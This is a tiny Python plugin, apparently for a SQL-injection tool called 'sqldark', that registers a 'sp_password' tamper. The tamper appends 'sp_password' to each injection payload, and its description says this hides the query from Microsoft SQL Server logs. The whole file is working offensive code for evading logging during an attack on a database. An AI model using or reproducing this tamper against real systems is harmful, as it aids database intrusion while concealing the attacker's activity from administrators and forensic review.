from sqldark.tamper import Tamper, register
@register
class SpPassword(Tamper):
    name="sp_password"
    description="MSSQL: append sp_password to hide the query from server logs"
    def tamper(self,p): return p + "sp_password"
